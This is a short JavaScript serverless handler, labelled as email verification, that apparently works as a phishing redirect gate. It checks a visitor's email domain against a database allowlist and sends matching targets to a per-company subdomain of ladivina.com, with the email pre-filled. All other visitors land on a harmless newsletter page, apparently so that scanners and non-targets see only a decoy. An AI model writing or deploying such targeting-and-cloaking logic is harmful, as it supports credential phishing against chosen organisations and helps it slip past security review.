import { MongoClient } from 'mongodb';

// Environment variables with fallbacks
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://username:password@cluster.mongodb.net/email-verification?retryWrites=true&w=majority';
const DB_NAME = process.env.MONGODB_DB || 'email-verification';
const DOMAINS_COLLECTION = 'allowed_domains';

// Connection caching
let cachedClient = null;
let cachedDb = null;

// Connect to MongoDB database
async function connectToDatabase() {
  try {
    if (cachedClient && cachedDb) {
      return { client: cachedClient, db: cachedDb };
    }
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    
    const db = client.db(DB_NAME);
    
    cachedClient = client;
    cachedDb = db;
    
    return { client, db };
  } catch (error) {
    console.error("MongoDB connection error:", error);
    throw error;
  }
}

// Check if domain is allowed in database
async function isDomainAllowed(domain) {
  try {
    const { db } = await connectToDatabase();
    const collection = db.collection(DOMAINS_COLLECTION);
    
    const domainRecord = await collection.findOne({ 
      domain: domain.toLowerCase() 
    });
    
    return !!domainRecord;
  } catch (error) {
    console.error('Error checking domain:', error);
    return false;
  }
}

export default async function handler(req, res) {
  try {
    // Get email from query parameter
    const { email } = req.query;
    if (!email) {
      return res.redirect('https://embeds.beehiiv.com/2832be21-8571-4474-a4a6-551a4bfc392d');
    }
    
    // Get domain from email
    const emailParts = email.split('@');
    if (emailParts.length !== 2) {
      return res.redirect('https://embeds.beehiiv.com/2832be21-8571-4474-a4a6-551a4bfc392d');
    }
    
    const domain = emailParts[1].toLowerCase();
    // Extract domain name without TLD (e.g., "example" from "example.com")
    const domainName = domain.split('.')[0];
    
    // Check if domain is allowed in database
    const isAllowed = await isDomainAllowed(domain);
    
    if (isAllowed) {
      // Use the domain name from the email instead of random subdomain
      res.redirect(`https://${domainName}.ladivina.com/9e639fa927324ca2a294b73e2b58d1fc?ext=${email}`);
    } else {
      res.redirect('https://embeds.beehiiv.com/2832be21-8571-4474-a4a6-551a4bfc392d');
    }
  } catch (error) {
    console.error('Error:', error);
    res.redirect('https://embeds.beehiiv.com/2832be21-8571-4474-a4a6-551a4bfc392d');
  }
}
